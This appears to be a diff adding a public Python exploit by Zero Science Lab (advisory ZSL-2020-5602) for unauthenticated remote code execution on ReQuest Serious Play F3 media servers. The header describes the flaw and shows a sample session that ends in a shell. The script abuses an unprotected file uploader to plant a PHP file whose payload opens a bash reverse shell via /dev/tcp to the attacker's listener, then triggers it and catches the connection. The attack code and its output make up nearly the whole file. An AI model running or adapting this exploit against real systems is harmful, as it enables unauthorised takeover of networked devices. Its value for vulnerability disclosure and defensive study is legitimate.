@@ -1,0 +1,193 @@
+# Exploit Title: ReQuest Serious Play F3 Media Server 7.0.3 - Remote Code Execution (Unauthenticated)
+# Exploit Author: LiquidWorm
+# Software Link: http://request.com/
+# Version: 3.0.0
+
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+#
+#
+# ReQuest Serious Play F3 Media Server 7.0.3 Unauthenticated Remote Code Execution
+# 
+# 
+# Vendor: ReQuest Serious Play LLC
+# Product web page: http://www.request.com
+# Affected version: 7.0.3.4968 (Pro)
+#                   7.0.2.4954
+#                   6.5.2.4954
+#                   6.4.2.4681
+#                   6.3.2.4203
+#                   2.0.1.823
+# 
+# Summary: F3 packs all the power of ReQuest's multi-zone serious Play servers
+# into a compact powerhouse. With the ability to add unlimited NAS devices, the
+# F3 can handle your entire family's media collection with ease.
+# 
+# Desc: The ReQuest ARQ F3 web server suffers from an unauthenticated remote
+# code execution vulnerability. Abusing the hidden ReQuest Internal Utilities
+# page (/tools) from the services provided, an attacker can exploit the Quick
+# File Uploader (/tools/upload.html) page and upload PHP executable files that
+# results in remote code execution as the web server user.
+#
+# =============================================================================
+# lqwrm@metalgear:~/prive$ python3 ReQuest.py 192.168.1.17:3664 192.168.1.22 6161
+# Let's see waddup...
+# Good to go.
+# Starting handler on port 6161.
+# Writing callback file...
+# We got the dir: /75302IV29ZS1
+# Checking write status...
+# All is well John Spartan. Calling your listener...
+# Connection from 192.168.0.17:42057
+# You got shell.
+# id;uname -ro
+# uid=81(apache) gid=81(apache) groups=81(apache),666(arq)
+# 3.2.0-4-686-pae GNU/Linux
+# exit
+# *** Connection closed by remote host ***
+# lqwrm@metalgear:~/prive$
+# =============================================================================
+# 
+# Tested on: ReQuest Serious Play® OS v7.0.1
+#            ReQuest Serious Play® OS v6.0.0
+#            Debian GNU/Linux 5.0
+#            Linux 3.2.0-4-686-pae
+#            Linux 2.6.36-request+lenny.5
+#            Apache/2.2.22
+#            Apache/2.2.9
+#            PHP/5.4.45
+#            PHP/5.2.6-1
+# 
+# 
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+# Macedonian Information Security Research and Development Laboratory
+# Zero Science Lab - https://www.zeroscience.mk - @zeroscience
+# 
+# 
+# Advisory ID: ZSL-2020-5602
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5602.php
+# 
+# 
+# 01.08.2020
+#
+
+from time import sleep
+import threading######
+import telnetlib######
+import requests#######
+import socket#########
+import sys############
+import re#############
+
+class Manhattan:
+    
+    def __init__(self):
+        self.secretagent = "Mushu"
+        self.payload = None
+        self.deploy = None
+        self.rhost = None
+        self.lhost = None
+        self.lport = None
+
+    def the_args(self):
+        if len(sys.argv) != 4:
+            self.the_usage()
+        else:
+            self.rhost = sys.argv[1]
+            self.lhost = sys.argv[2]
+            self.lport = int(sys.argv[3])
+            if not "http" in self.rhost:
+                self.rhost = "http://{}".format(self.rhost)
+
+    def the_usage(self):
+        self.the_wha()
+        print("Usage: python3 {} [targetIP:targetPORT] [localIP] [localPORT]".format(sys.argv[0]))
+        print("Example: python3 {} 192.168.0.91:3664 192.168.0.22 6161\n".format(sys.argv[0]))
+        exit(0)
+
+    def the_wha(self):
+        titl = "ReQuest Serious Play F3 Media Server RCE"
+        print(titl)
+
+    def the_check(self):
+        print("Let's see waddup...")
+        try:
+            r = requests.get(self.rhost + "/MP3/")
+            if "000000000000" in r.text:
+                print("Good to go.")
+            else:
+                print("Something's fishy.")
+                exit(-16)
+        except Exception as e:
+            print("Hmmm {msg}".format(msg=e))
+            exit(-1)
+
+    def the_upload(self):
+        print("Writing callback file...")
+        self.headers = {"Cache-Control" : "max-age=0", 
+                        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarylGyylNPXG5WMGCqP",
+                        "User-Agent": self.secretagent,
+                        "Accept" : "*/*",
+                        "Accept-Encoding": "gzip, deflate",
+                        "Accept-Language": "en-US,en;q=0.9",
+                        "Connection": "close"}
+    
+        self.payload = "<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/" + self.lhost+ "/" +str(self.lport) + "  <&1;rm bd0.php'\");"
+
+        self.deploy  = "------WebKitFormBoundarylGyylNPXG5WMGCqP\r\n"########
+        self.deploy += "Content-Disposition: form-data; name=\"uploa"       #
+        self.deploy += "dedfile\"; filename=\"bd0.php\"\r\nContent-T"       #
+        self.deploy += "ype: application/octet-stream\r\n\r\n" + self.payload
+        self.deploy += "\r\n------WebKitFormBoundarylGyylNPXG5WMGCqP\r\nConte"
+        self.deploy += "nt-Disposition: form-data; name=\"location\"\r\n\r\nm"
+        self.deploy += "p3\r\n------WebKitFormBoundarylGyylNPXG5WMGCqP--\r\n"
+    
+        requests.post(self.rhost+"/shared/upload.php", headers=self.headers, data=self.deploy)
+        sleep(1)
+        r = requests.get(self.rhost + "/MP3/")
+        regex = re.findall(r'a\shref=\"(.*)\/\">', r.text)[2]
+        print("We got the dir: /" + regex)
+        print("Checking write status...")
+        r = requests.get(self.rhost + "/MP3/" + regex)
+        if "bd0" in r.text:
+            print("All is well John Spartan. Calling your listener...")
+        else:
+            print("Something...isn't right.")
+            exit(-16)    
+        requests.get(self.rhost + "/MP3/"+ regex + "/bd0.php")       
+
+    def the_subp(self):
+        konac = threading.Thread(name="ZSL", target=self.the_ear)
+        konac.start()
+        sleep(1)
+        self.the_upload()
+
+    def the_ear(self):
+        telnetus = telnetlib.Telnet()
+        print("Starting handler on port {}.".format(self.lport))
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind(("0.0.0.0", self.lport))
+        while True:
+            try:
+                s.settimeout(7)
+                s.listen(1)
+                conn, addr = s.accept()
+                print("Connection from {}:{}".format(addr[0], addr[1]))
+                telnetus.sock = conn
+            except socket.timeout as p:
+                print("Hmmm ({msg})".format(msg=p))
+                s.close()
+                exit(0)
+            break
+
+        print("You got shell.")
+        telnetus.interact()
+        conn.close()
+
+    def main(self):
+        self.the_args()
+        self.the_check()
+        self.the_subp()
+
+if __name__ == '__main__':
+    Manhattan().main()
